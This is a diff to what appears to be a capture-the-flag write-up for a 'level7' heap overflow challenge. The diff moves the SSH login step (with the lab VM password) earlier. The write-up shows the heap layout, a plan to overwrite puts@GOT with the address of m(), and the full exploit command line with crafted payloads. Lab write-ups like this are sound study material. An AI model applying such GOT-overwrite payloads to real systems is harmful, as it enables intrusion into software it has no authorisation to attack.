@@ -10,7 +10,11 @@
    - Global variable c at 0x08049960 (80 bytes)
    - puts@GOT at 0x08049928
 
-3. Verify heap layout with ltrace:
+3. Connect to the VM via SSH:
+   ssh level7@localhost -p 2222
+   Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+4. Verify heap layout with ltrace:
    ltrace ./level7 AAA BBB
    
    Output shows:
@@ -19,7 +23,7 @@
    malloc(8)  = 0x0804a028  ← ptr2 structure
    malloc(8)  = 0x0804a038  ← ptr2->data buffer
 
-4. Calculate the exploit:
+5. Calculate the exploit:
    Goal: Overwrite puts@GOT to point to m()
    
    Distance from ptr1->data to ptr2->data pointer:
@@ -33,10 +37,6 @@
    argv[2]: Write m()'s address to puts@GOT
    - Target: 0x080484f4 (address of m)
    - Little-endian: \xf4\x84\x04\x08
-
-5. Connect to the VM via SSH:
-   ssh level7@localhost -p 2222
-   Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 6. Execute the exploit:
    ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
